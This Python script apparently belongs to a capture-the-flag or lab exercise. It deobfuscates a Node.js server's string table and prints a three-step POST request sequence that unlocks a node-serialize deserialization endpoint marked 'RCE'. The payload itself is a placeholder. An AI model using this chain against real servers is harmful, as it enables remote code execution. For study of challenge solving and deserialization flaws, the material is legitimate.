#!/usr/bin/env python3
# Verify the exact values and the correct a.aa check string

arr_original = ['Welcome guest','4yLTFPA','/vuln','30904Xqnjvn','2177UMQZVs','130hyXqvt','send','/vuqsqsddqsdln123','body','log','use','disable','get','post','/vuqsqsqdsddqsd2189ln','/vuqsqsqdsddqsdl1221n','4929897UCtxHg','722307QCOqZr','/vuqsqsqdsdqsddqsdln','/vuqsqsq11212dsddqsdln','Hello World!','mi12n','3870270VguSFA','admin','203495djbriC','listen','328977RKzETf','Welcome admin','/vuqsqsqdsddqsdln','data','92qCdBYq','/vuqsdqsdln','Server is running on port ','/vul18ddqsdln126','/vuqsq1212qsqdsddqsdln','node-serialize','53707093OWMjaY','unserialize','urlencoded','ad1','/vuqs1244qsqdsddqsdln','x-powered-by']

def lookup(idx, rotation=15):
    idx = idx - 0x74
    return arr_original[(idx + rotation) % len(arr_original)]

print("=== Key lookups ===")
print(f"lookup(0x7a) = '{lookup(0x7a)}'")   # Used in step 2 a.aa check
print(f"lookup(0x8c) = '{lookup(0x8c)}'")   # Used in step 1 trigger
print(f"lookup(0x82) = '{lookup(0x82)}'")   # body key name
print(f"lookup(0x96) = '{lookup(0x96)}'")   # step 1 route
print(f"lookup(0x86) = '{lookup(0x86)}'")   # vuln route
print(f"lookup(0x8a) = '{lookup(0x8a)}'")   # unserialize method
print(f"lookup(0x95) = '{lookup(0x95)}'")   # send method
print(f"lookup(0x97) = '{lookup(0x97)}'")   # body reference

print()
print("=== State machine logic ===")
print()

# Part 8: POST lookup(0x96) => route
step1_route = lookup(0x96)
# body key: lookup(0x82) => 'data'
# trigger: lookup(0x8c) + lookup(0x7a)
step1_trigger = lookup(0x8c) + lookup(0x7a)
# a.aa set to: 'ad1mi1' + '2n' = 'ad1mi12n'
step1_sets_aa = 'ad1mi1' + '2n'

print(f"STEP 1:")
print(f"  Route: POST {step1_route}")
print(f"  Condition: req.body['{lookup(0x82)}'] == '{step1_trigger}'")
print(f"  Action: a['aa'] = '{step1_sets_aa}'")

# Part 11: POST /vuqsqsqdsddqsdln1 (hardcoded)
# body key is hardcoded 'data'
# trigger: 'b'+'a'+'12' = 'ba12'
# check: a['aa'] == 'ad'+'1'+lookup(0x7a)
step2_route = '/vuqsqsqdsddqsdln1'
step2_trigger = 'b'+'a'+'12'
step2_check_aa = 'ad'+'1'+lookup(0x7a)
step2_sets_za = 'a'+'12'+'b'

print(f"\nSTEP 2:")
print(f"  Route: POST {step2_route}")
print(f"  Condition: req.body['data'] == '{step2_trigger}'")
print(f"             AND a['aa'] == '{step2_check_aa}'")
print(f"  Action: a['za'] = '{step2_sets_za}'")

print(f"\nDoes step1 set a.aa correctly for step2?")
print(f"  step1 sets: '{step1_sets_aa}'")
print(f"  step2 needs: '{step2_check_aa}'")
print(f"  Match: {step1_sets_aa == step2_check_aa}")

# Part 14: POST lookup(0x86)
vuln_route = lookup(0x86)
vuln_check = 'a1'+'2b'
vuln_method = f"serialize['{lookup(0x8a)}']"

print(f"\nSTEP 3 (EXPLOIT):")
print(f"  Route: POST {vuln_route}")
print(f"  Condition: a['za'] == '{vuln_check}'")
print(f"  Action: result = {vuln_method}(req.body['data'])")
print(f"          => node-serialize RCE!")

print(f"\nDoes step2 set a.za for step3?")
print(f"  step2 sets: '{step2_sets_za}'")
print(f"  step3 needs: '{vuln_check}'")
print(f"  Match: {step2_sets_za == vuln_check}")

print()
print("=== EXPLOIT SEQUENCE ===")
print(f"1. POST {step1_route}  data={step1_trigger}")
print(f"2. POST {step2_route}  data={step2_trigger}")
print(f"3. POST {vuln_route}   data=<node-serialize RCE payload>")
print()
print("NOTE: a is a GLOBAL shared object, state persists between requests")
print("PROBLEM: If server has multiple workers or restarts, state resets")
print()
print("=== Checking the RCE return value issue ===")
print("serialize.unserialize(payload) returns the deserialized object")
print("e.g. {'rce': <return_value_of_function>}")
print("res.send({'rce': 'uid=...'}) will JSON-stringify it, so it should show!")
print("But res.send(_0xbd742b||'ok') -- if unserialize returns falsy object, 'ok' shows")
print("An empty object {} is truthy, so it should be sent as JSON!")
print()
print("HYPOTHESIS: The state a.za is NOT being set - maybe there's a load balancer")
print("OR the _0x557af8(0x7a) key in step 2 doesn't match what step 1 sets")

print()
print("WAIT - let me re-read the actual code more carefully:")
print("Part 8 uses: _0x525df3(0x8c) + _0x525df3(0x7a)")
print(f"= '{lookup(0x8c)}' + '{lookup(0x7a)}'")
print(f"= '{lookup(0x8c) + lookup(0x7a)}'")
print()
print("Part 11 checks: 'ad'+'1'+_0x557af8(0x7a)")
print(f"= 'ad' + '1' + '{lookup(0x7a)}'")
print(f"= 'ad1{lookup(0x7a)}'")
